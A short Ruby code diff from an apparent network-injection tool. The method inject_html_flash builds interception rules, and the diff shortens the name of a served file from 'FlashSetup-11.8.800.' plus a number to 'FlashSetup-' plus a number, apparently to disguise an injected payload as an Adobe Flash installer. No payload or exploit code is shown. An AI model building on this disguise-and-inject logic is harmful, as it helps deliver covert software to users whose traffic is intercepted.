@@ -115,7 +115,7 @@ class InjectorTask
   end
 
   def inject_html_flash(intercept_files, progressive, redirect_user, rule, vector_files)
-    appname = 'FlashSetup-11.8.800.' + progressive.to_s
+    appname = 'FlashSetup-' + progressive.to_s
     intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
 
     begin
